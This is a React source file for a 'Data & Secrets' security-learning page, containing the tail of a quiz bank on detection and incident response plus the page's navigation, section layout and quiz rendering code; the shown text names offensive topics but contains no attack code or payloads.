    topic: "Detection",
    question: "Canary tokens are used to:",
    options: [
      "Detect unauthorized access to sensitive assets",
      "Encrypt data",
      "Block uploads",
      "Remove logs",
    ],
    correctAnswer: 0,
    explanation: "Canaries trigger alerts when accessed.",
  },
  {
    id: 65,
    topic: "Response",
    question: "During an incident, you should first:",
    options: [
      "Preserve evidence before cleanup",
      "Delete logs",
      "Rotate all passwords without context",
      "Disable monitoring",
    ],
    correctAnswer: 0,
    explanation: "Evidence collection is critical for root cause analysis.",
  },
  {
    id: 66,
    topic: "Response",
    question: "Regulatory notification should involve:",
    options: [
      "Legal and compliance teams",
      "Only engineering",
      "Only marketing",
      "Only vendors",
    ],
    correctAnswer: 0,
    explanation: "Legal guidance ensures proper reporting and timelines.",
  },
  {
    id: 67,
    topic: "Response",
    question: "After a leak, you should:",
    options: [
      "Rotate exposed keys and invalidate sessions",
      "Ignore the exposure",
      "Disable all logging",
      "Publish the data",
    ],
    correctAnswer: 0,
    explanation: "Rotation reduces ongoing abuse of exposed credentials.",
  },
  {
    id: 68,
    topic: "Response",
    question: "Regression tests help by:",
    options: [
      "Ensuring data exposure fixes do not return",
      "Removing access controls",
      "Disabling alerts",
      "Reducing audit trails",
    ],
    correctAnswer: 0,
    explanation: "Tests prevent regressions in sensitive areas.",
  },
  {
    id: 69,
    topic: "Response",
    question: "Read-only database accounts are best for:",
    options: [
      "Reporting and analytics workloads",
      "Admin tooling",
      "Schema changes",
      "User management",
    ],
    correctAnswer: 0,
    explanation: "Read-only access reduces risk in reporting paths.",
  },
  {
    id: 70,
    topic: "Response",
    question: "Access logging should capture:",
    options: [
      "User, resource, action, and timestamp",
      "Only hostnames",
      "Only file size",
      "Only error codes",
    ],
    correctAnswer: 0,
    explanation: "Full context supports audits and investigations.",
  },
  {
    id: 71,
    topic: "Response",
    question: "Periodic access reviews help ensure:",
    options: [
      "Permissions remain appropriate over time",
      "Logs are deleted",
      "Backups are disabled",
      "Encryption is removed",
    ],
    correctAnswer: 0,
    explanation: "Reviews catch privilege creep and stale access.",
  },
  {
    id: 72,
    topic: "Response",
    question: "Secure deletion is difficult because:",
    options: [
      "Backups and replicas may retain data",
      "It is always instant",
      "It requires no tooling",
      "It is the same as archiving",
    ],
    correctAnswer: 0,
    explanation: "Data can persist in backups and replicated storage.",
  },
  {
    id: 73,
    topic: "Response",
    question: "Third-party data risk should be managed by:",
    options: [
      "Vendor assessments and contractual controls",
      "Sharing all secrets",
      "Disabling monitoring",
      "Publicly exposing data",
    ],
    correctAnswer: 0,
    explanation: "Vendors must meet security requirements for data handling.",
  },
  {
    id: 74,
    topic: "Response",
    question: "Security testing on data sources should:",
    options: [
      "Be authorized and scoped in writing",
      "Be done on production without notice",
      "Ignore legal requirements",
      "Skip documentation",
    ],
    correctAnswer: 0,
    explanation: "Authorization and scope are required for safe testing.",
  },
  {
    id: 75,
    topic: "Response",
    question: "Chain of custody is important because:",
    options: [
      "It documents evidence handling for legal defensibility",
      "It replaces backups",
      "It hides findings",
      "It removes audit logs",
    ],
    correctAnswer: 0,
    explanation: "Evidence handling must be documented and defensible.",
  },
];

export default function DataSecretsPage() {
  const theme = useTheme();
  const [activeSection, setActiveSection] = useState("intro");
  const [mobileNavOpen, setMobileNavOpen] = useState(false);
  const isMobile = useMediaQuery("(max-width:900px)");
  const [expandedAccordion, setExpandedAccordion] = useState<string | false>("panel-0");

  const scrollToSection = (sectionId: string) => {
    setActiveSection(sectionId);
    const element = document.getElementById(sectionId);
    if (element) {
      const yOffset = -80;
      const y = element.getBoundingClientRect().top + window.pageYOffset + yOffset;
      window.scrollTo({ top: y, behavior: "smooth" });
    }
    setMobileNavOpen(false);
  };

  useEffect(() => {
    const handleScroll = () => {
      const sectionIds = sectionNavItems.map((item) => item.id);
      for (const id of sectionIds) {
        const element = document.getElementById(id);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 120 && rect.bottom >= 120) {
            setActiveSection(id);
            break;
          }
        }
      }
    };
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const sidebarNav = (
    <Box sx={{ position: "sticky", top: 90 }}>
      <Paper sx={{ p: 2, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
        <Typography variant="subtitle2" sx={{ color: themeColors.primary, fontWeight: 700, mb: 2, px: 1 }}>
          CONTENTS
        </Typography>
        <List dense disablePadding>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              component="button"
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1,
                mb: 0.5,
                cursor: "pointer",
                border: "none",
                width: "100%",
                textAlign: "left",
                bgcolor: activeSection === item.id ? `${themeColors.primary}20` : "transparent",
                "&:hover": { bgcolor: `${themeColors.primary}15` },
              }}
            >
              <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? themeColors.primary : themeColors.textMuted }}>
                {item.icon}
              </ListItemIcon>
              <ListItemText
                primary={item.label}
                primaryTypographyProps={{
                  variant: "body2",
                  fontWeight: activeSection === item.id ? 600 : 400,
                  color: activeSection === item.id ? themeColors.primary : themeColors.textMuted,
                }}
              />
            </ListItem>
          ))}
        </List>
      </Paper>
    </Box>
  );

  const pageContext = `This page covers Data & Secrets security topics including:
- File upload vulnerabilities and bypass techniques
- File download security and path traversal attacks
- Data storage security from an attacker's perspective
- Logs, caches, backups, and temporary file hunting
- Secrets hunting in code, repos, frontends, and infrastructure
- Cryptographic misuse and exploitation
- Data exfiltration techniques and impact assessment
- Comprehensive attacker checklists for each topic`;

  const renderSubSection = (sub: SubSection, index: number) => (
    <Box key={index} sx={{ mb: 4 }}>
      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "text.primary" }}>
        {sub.title}
      </Typography>

      {/* Detailed Description for Beginners */}
      {sub.detailedDescription && (
        <Paper 
          sx={{ 
            p: 2.5, 
            mb: 3, 
            bgcolor: alpha(theme.palette.info.main, 0.04),
            borderRadius: 2, 
            border: `1px solid ${alpha(theme.palette.info.main, 0.15)}`,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
            <MenuBookIcon sx={{ color: "info.main", fontSize: 20 }} />
            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "info.main" }}>
              In-Depth Explanation
            </Typography>
          </Box>
          <Typography 
            variant="body2" 
            sx={{ 
              whiteSpace: "pre-line", 
              color: "text.secondary", 
              lineHeight: 1.75,
              "& strong": { color: "text.primary", fontWeight: 600 },
            }}
            dangerouslySetInnerHTML={{ 
              __html: sub.detailedDescription
                .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
                .replace(/\n\n/g, '<br/><br/>')
            }}
          />
        </Paper>
      )}

      {/* Real World Example */}
      {sub.realWorldExample && (
        <Alert 
          severity="warning" 
          icon={<PublicIcon />}
          sx={{ 
            mb: 2.5, 
            borderRadius: 2,
            "& .MuiAlert-message": { width: "100%" }
          }}
        >
          <AlertTitle sx={{ fontWeight: 700 }}>Real-World Case Study</AlertTitle>
          <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
            {sub.realWorldExample}
          </Typography>
        </Alert>
      )}

      {/* Beginner Tips */}
      {sub.beginnerTips && sub.beginnerTips.length > 0 && (
        <Alert 
          severity="success" 
          icon={<TipsAndUpdatesIcon />}
          sx={{ 
            mb: 2.5, 
            borderRadius: 2,
            "& .MuiAlert-message": { width: "100%" }
          }}
        >
          <AlertTitle sx={{ fontWeight: 700 }}>Beginner Tips</AlertTitle>
          <Box component="ul" sx={{ m: 0, pl: 2.5 }}>
            {sub.beginnerTips.map((tip, i) => (
              <Box component="li" key={i} sx={{ mb: 0.75 }}>
                <Typography variant="body2" sx={{ lineHeight: 1.6 }}>{tip}</Typography>
              </Box>
            ))}
          </Box>
        </Alert>
      )}

      {sub.points && (
        <List dense sx={{ mb: 2 }}>
          {sub.points.map((point, i) => (
            <ListItem key={i} sx={{ py: 0.5 }}>
              <ListItemIcon sx={{ minWidth: 32 }}>
                <CheckCircleIcon sx={{ fontSize: 16, color: "success.main" }} />
              </ListItemIcon>
              <ListItemText 
                primary={point} 
                primaryTypographyProps={{ variant: "body2" }} 
              />
            </ListItem>
          ))}
        </List>
      )}

      {sub.table && (
        <TableContainer component={Paper} variant="outlined" sx={{ mb: 2, borderRadius: 2 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.05) }}>
                {sub.table.headers.map((h, i) => (
                  <TableCell key={i} sx={{ fontWeight: 700 }}>{h}</TableCell>
                ))}
              </TableRow>
            </TableHead>
            <TableBody>
              {sub.table.rows.map((row, i) => (
                <TableRow key={i} hover>
                  {row.map((cell, j) => (
                    <TableCell key={j}>
                      <Typography variant="body2" sx={{ fontFamily: j === 0 ? "monospace" : "inherit", fontSize: "0.85rem" }}>
                        {cell}
                      </Typography>
                    </TableCell>
                  ))}
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>
      )}

      {sub.code && (
        <Paper
          sx={{
            p: 2,
            mb: 2,
            bgcolor: alpha(theme.palette.common.black, 0.8),
            borderRadius: 2,
            overflow: "auto",
          }}
        >
          <Typography
            component="pre"
            sx={{
              fontFamily: "monospace",
              fontSize: "0.8rem",
              color: "#e2e8f0",
              whiteSpace: "pre-wrap",
              wordBreak: "break-word",
              m: 0,
            }}
          >
            {sub.code}
          </Typography>
        </Paper>
      )}

      {sub.warning && (
        <Alert severity="warning" sx={{ mb: 2, borderRadius: 2 }}>
          <Typography variant="body2">{sub.warning}</Typography>
        </Alert>
      )}

      {sub.tip && (
        <Alert severity="info" sx={{ mb: 2, borderRadius: 2 }}>
          <Typography variant="body2">💡 {sub.tip}</Typography>
        </Alert>
      )}

      {sub.testIdeas && (
        <Card variant="outlined" sx={{ mb: 2, borderRadius: 2, borderColor: alpha(theme.palette.error.main, 0.3), bgcolor: alpha(theme.palette.error.main, 0.02) }}>
          <CardContent sx={{ py: 2, "&:last-child": { pb: 2 } }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1.5, color: "error.main", display: "flex", alignItems: "center", gap: 1 }}>
              <BugReportIcon fontSize="small" /> Test Ideas
            </Typography>
            <List dense sx={{ py: 0 }}>
              {sub.testIdeas.map((idea, i) => (
                <ListItem key={i} sx={{ py: 0.25, pl: 0 }}>
                  <ListItemIcon sx={{ minWidth: 24 }}>
                    <Box sx={{ width: 6, height: 6, borderRadius: "50%", bgcolor: "error.main" }} />
                  </ListItemIcon>
                  <ListItemText 
                    primary={idea} 
                    primaryTypographyProps={{ variant: "body2", color: "text.secondary" }} 
                  />
                </ListItem>
              ))}
            </List>
          </CardContent>
        </Card>
      )}
    </Box>
  );

  return (
    <LearnPageLayout pageTitle="Data & Secrets" pageContext={pageContext}>
      <Container maxWidth="xl" sx={{ py: 4 }}>
        {/* Back Button */}
        <Chip
          component={Link}
          to="/learn"
          icon={<ArrowBackIcon />}
          label="Back to Learning Hub"
          clickable
          variant="outlined"
          sx={{ borderRadius: 2, mb: 3 }}
        />

        <Grid container spacing={4}>
          {/* Left Sidebar Navigation */}
          {!isMobile && (
            <Grid item md={2.5}>
              {sidebarNav}
            </Grid>
          )}

          {/* Main Content */}
          <Grid item xs={12} md={isMobile ? 12 : 9.5}>
            {/* Introduction Section */}
            <Paper id="intro" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
                <Box
                  sx={{
                    width: 64,
                    height: 64,
                    borderRadius: 3,
                    background: `linear-gradient(135deg, ${themeColors.primary}, ${themeColors.secondary})`,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <FolderIcon sx={{ fontSize: 32, color: "white" }} />
                </Box>
                <Box>
                  <Typography
                    variant="h3"
                    sx={{
                      fontWeight: 800,
                      background: `linear-gradient(135deg, ${themeColors.primary}, ${themeColors.secondary}, ${themeColors.accent})`,
                      backgroundClip: "text",
                      WebkitBackgroundClip: "text",
                      WebkitTextFillColor: "transparent",
                    }}
                  >
                    Data & Secrets
                  </Typography>
                  <Typography variant="subtitle1" sx={{ color: themeColors.textMuted }}>
                    Files, Uploads, Storage, Crypto Misuse & Secrets Hunting
                  </Typography>
                </Box>
              </Box>

              <Typography variant="body1" sx={{ color: themeColors.textMuted, mb: 3, lineHeight: 1.8 }}>
                Everything about finding, accessing, and extracting data that applications didn't intend to expose.
                From file upload bypass to secrets hunting to abusing weak cryptography.
              </Typography>

              <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1, mb: 3 }}>
                {["File Uploads", "File Downloads", "Data Storage", "Logs & Backups", "Secrets Hunting", "Crypto Misuse", "Data Exfiltration"].map((topic) => (
                  <Chip key={topic} label={topic} size="small" sx={{ bgcolor: alpha(themeColors.primary, 0.1), color: themeColors.primaryLight }} />
                ))}
              </Box>

              <Divider sx={{ my: 3, borderColor: themeColors.border }} />

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e2e8f0" }}>
                🎯 Learning Objectives
              </Typography>
              <List dense>
                {[
                  "Understand file upload vulnerabilities and bypass techniques",
                  "Master path traversal and IDOR attacks on file downloads",
                  "Learn to hunt for secrets in code, repos, and infrastructure",
                  "Recognize and exploit cryptographic misuse patterns",
                  "Quantify and communicate data breach impact effectively",
                ].map((objective, i) => (
                  <ListItem key={i} sx={{ py: 0.5 }}>
                    <ListItemIcon sx={{ minWidth: 32 }}>
                      <CheckCircleIcon sx={{ fontSize: 18, color: themeColors.primary }} />
                    </ListItemIcon>
                    <ListItemText primary={objective} primaryTypographyProps={{ variant: "body2", color: "#e2e8f0" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>

            {/* Overview Section */}
            <Paper id="overview" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <DashboardIcon /> Overview
              </Typography>

              <Grid container spacing={2} sx={{ mb: 3 }}>
                {[
                  { label: "Topics", value: "8", color: themeColors.primary },
                  { label: "Techniques", value: "80+", color: themeColors.secondary },
                  { label: "Code Examples", value: "25+", color: themeColors.accent },
                  { label: "Checklists", value: "7", color: "#10b981" },
                ].map((stat) => (
                  <Grid item xs={6} sm={3} key={stat.label}>
                    <Paper
                      sx={{
                        p: 2,
                        textAlign: "center",
                        borderRadius: 2,
                        border: `1px solid ${alpha(stat.color, 0.2)}`,
                        bgcolor: alpha(stat.color, 0.03),
                      }}
                    >
                      <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>
                        {stat.value}
                      </Typography>
                      <Typography variant="caption" sx={{ color: themeColors.textMuted }}>
                        {stat.label}
                      </Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              <Alert severity="warning" sx={{ borderRadius: 2, bgcolor: alpha("#f59e0b", 0.1), border: `1px solid ${alpha("#f59e0b", 0.3)}` }}>
                <Typography variant="body2">
                  <strong>Critical Reminders:</strong> Always get authorization before testing. Don't exfiltrate real data - prove access, document impact.
                  Mask credentials in reports. Chain vulnerabilities for maximum impact demonstration.
                </Typography>
              </Alert>
            </Paper>

            {/* Section 0: File Uploads */}
            <Paper id="file-uploads" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: sections[0].color, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                {sections[0].icon} {sections[0].title}
              </Typography>
              {sections[0].subsections.map((sub, j) => (
                <Accordion key={j} expanded={expandedAccordion === `panel-0-${j}`} onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-0-${j}` : false)} sx={{ mb: 2, bgcolor: themeColors.bgNested, borderRadius: "12px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: sections[0].color }} />}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e2e8f0" }}>{sub.title}</Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>{renderSubSection(sub, j)}</AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* Section 1: File Downloads */}
            <Paper id="file-downloads" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: sections[1].color, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                {sections[1].icon} {sections[1].title}
              </Typography>
              {sections[1].subsections.map((sub, j) => (
                <Accordion key={j} expanded={expandedAccordion === `panel-1-${j}`} onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-1-${j}` : false)} sx={{ mb: 2, bgcolor: themeColors.bgNested, borderRadius: "12px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: sections[1].color }} />}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e2e8f0" }}>{sub.title}</Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>{renderSubSection(sub, j)}</AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* Section 2: Data Storage */}
            <Paper id="data-storage" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: sections[2].color, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                {sections[2].icon} {sections[2].title}
              </Typography>
              {sections[2].subsections.map((sub, j) => (
                <Accordion key={j} expanded={expandedAccordion === `panel-2-${j}`} onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-2-${j}` : false)} sx={{ mb: 2, bgcolor: themeColors.bgNested, borderRadius: "12px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: sections[2].color }} />}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e2e8f0" }}>{sub.title}</Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>{renderSubSection(sub, j)}</AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* Section 3: Logs & Backups */}
            <Paper id="logs-backups" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: sections[3].color, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                {sections[3].icon} {sections[3].title}
              </Typography>
              {sections[3].subsections.map((sub, j) => (
                <Accordion key={j} expanded={expandedAccordion === `panel-3-${j}`} onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-3-${j}` : false)} sx={{ mb: 2, bgcolor: themeColors.bgNested, borderRadius: "12px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: sections[3].color }} />}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e2e8f0" }}>{sub.title}</Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>{renderSubSection(sub, j)}</AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* Section 4: Secrets Hunting */}
            <Paper id="secrets-hunting" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: sections[4].color, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                {sections[4].icon} {sections[4].title}
              </Typography>
              {sections[4].subsections.map((sub, j) => (
                <Accordion key={j} expanded={expandedAccordion === `panel-4-${j}`} onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-4-${j}` : false)} sx={{ mb: 2, bgcolor: themeColors.bgNested, borderRadius: "12px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: sections[4].color }} />}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e2e8f0" }}>{sub.title}</Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>{renderSubSection(sub, j)}</AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* Section 5: Crypto Misuse */}
            <Paper id="crypto-misuse" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: sections[5].color, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                {sections[5].icon} {sections[5].title}
              </Typography>
              {sections[5].subsections.map((sub, j) => (
                <Accordion key={j} expanded={expandedAccordion === `panel-5-${j}`} onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-5-${j}` : false)} sx={{ mb: 2, bgcolor: themeColors.bgNested, borderRadius: "12px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: sections[5].color }} />}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e2e8f0" }}>{sub.title}</Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>{renderSubSection(sub, j)}</AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* Section 6: Data Exfiltration */}
            <Paper id="data-exfil" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: sections[6].color, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                {sections[6].icon} {sections[6].title}
              </Typography>
              {sections[6].subsections.map((sub, j) => (
                <Accordion key={j} expanded={expandedAccordion === `panel-6-${j}`} onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-6-${j}` : false)} sx={{ mb: 2, bgcolor: themeColors.bgNested, borderRadius: "12px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: sections[6].color }} />}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e2e8f0" }}>{sub.title}</Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>{renderSubSection(sub, j)}</AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* Section 7: Attacker Checklist */}
            <Paper id="checklist" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: sections[7].color, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                {sections[7].icon} {sections[7].title}
              </Typography>
              {sections[7].subsections.map((sub, j) => (
                <Accordion key={j} expanded={expandedAccordion === `panel-7-${j}`} onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-7-${j}` : false)} sx={{ mb: 2, bgcolor: themeColors.bgNested, borderRadius: "12px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: sections[7].color }} />}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e2e8f0" }}>{sub.title}</Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>{renderSubSection(sub, j)}</AccordionDetails>
                </Accordion>
              ))}
            </Paper>

            {/* Quiz Section */}
            <Paper
              id="quiz-section"
              sx={{
                p: 3,
                mb: 4,
                bgcolor: themeColors.bgCard,
                borderRadius: 2,
                border: `1px solid ${themeColors.border}`,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2, color: QUIZ_ACCENT_COLOR }}>
                <QuizIcon /> Knowledge Check
              </Typography>
              <QuizSection
                questions={quizQuestions}
                accentColor={QUIZ_ACCENT_COLOR}
                title="Data and Secrets Knowledge Check"
                description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
                questionsPerQuiz={QUIZ_QUESTION_COUNT}
              />
            </Paper>
          </Grid>
        </Grid>

        {/* Mobile Navigation Drawer */}
        <Drawer
          anchor="left"
          open={mobileNavOpen}
          onClose={() => setMobileNavOpen(false)}
          sx={{ display: { md: "none" } }}
          PaperProps={{ sx: { width: 280, bgcolor: themeColors.bgCard, p: 2 } }}
        >
          <Typography variant="subtitle2" sx={{ color: themeColors.primary, fontWeight: 700, mb: 2, px: 1 }}>
            CONTENTS
          </Typography>
          <List dense disablePadding>
            {sectionNavItems.map((item) => (
              <ListItem
                key={item.id}
                component="button"
                onClick={() => scrollToSection(item.id)}
                sx={{
                  borderRadius: 1,
                  mb: 0.5,
                  cursor: "pointer",
                  border: "none",
                  width: "100%",
                  textAlign: "left",
                  bgcolor: activeSection === item.id ? `${themeColors.primary}20` : "transparent",
                  "&:hover": { bgcolor: `${themeColors.primary}15` },
                }}
              >
                <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? themeColors.primary : themeColors.textMuted }}>
                  {item.icon}
                </ListItemIcon>
                <ListItemText
                  primary={item.label}
                  primaryTypographyProps={{
                    variant: "body2",
                    fontWeight: activeSection === item.id ? 600 : 400,
                    color: activeSection === item.id ? themeColors.primary : themeColors.textMuted,
                  }}
                />
              </ListItem>
            ))}
          </List>
        </Drawer>

        {/* Mobile FABs */}
        {isMobile && (
          <>
            <Fab
              size="small"
              onClick={() => setMobileNavOpen(true)}
              sx={{
                position: "fixed",
                bottom: 80,
                right: 16,
                bgcolor: themeColors.primary,
                color: "white",
                "&:hover": { bgcolor: themeColors.primaryLight },
              }}
            >
              <MenuIcon />
            </Fab>
            <Fab
              size="small"
              onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
              sx={{
                position: "fixed",
                bottom: 16,
                right: 16,
                bgcolor: themeColors.bgCard,
                color: themeColors.primary,
                border: `1px solid ${themeColors.border}`,
                "&:hover": { bgcolor: themeColors.bgNested },
              }}
            >
              <KeyboardArrowUpIcon />
            </Fab>
          </>
        )}
      </Container>
    </LearnPageLayout>
  );
}
